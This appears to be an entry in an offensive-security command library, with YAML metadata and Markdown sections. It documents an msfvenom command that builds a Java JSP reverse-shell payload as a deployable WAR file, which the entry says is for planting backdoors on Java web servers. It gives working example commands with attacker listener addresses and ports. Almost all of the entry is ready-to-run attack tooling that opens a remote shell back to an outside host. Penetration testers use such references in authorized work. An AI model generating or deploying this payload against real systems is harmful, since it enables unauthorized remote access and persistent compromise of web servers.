---
id: 8c9bc76e-93cb-41e3-b34a-50215452a464
name: msfvenom-java-jsp-reverse-tcp-war
type: command
executor: bash
data: >-
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f war >
  reverse.war
output: null
created_at: '2023-04-06T03:56:24.622809+00:00'
updated_at: '2023-04-10T20:25:27.396541+00:00'
platforms:
  - Linux
tags:
  - payload
  - reverse-shell
  - java
verified: true
validated: true
---

# msfvenom-java-jsp-reverse-tcp-war

## Command

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f war > reverse.war
```

## Description

This command generates a Java JSP reverse TCP shell payload formatted as a deployable WAR archive using Metasploit's msfvenom. It is used to create backdoors for Java web servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | IP address of the attacker's listening host | Yes |
| $_LPORT | Port on which the attacker is listening for the reverse connection | Yes |
| -p java/jsp_shell_reverse_tcp | Specifies the payload type for Java JSP reverse shell | Yes |
| -f war | Sets the output format to WAR archive | Yes |
| > reverse.war | Redirects output to the named WAR file | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war > shell.war
```

### Advanced Usage

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war -o custom_shell.war
```

## Expected Output

The command produces no stdout; it creates a binary WAR file (e.g., reverse.war) containing the encoded JSP payload. Verify with `file reverse.war` which should show "Zip archive data".

## Related

- [[procedures/Generate-Java-Reverse-Shell-WAR-Payload]]
- [[tools/Metasploit-Framework]]
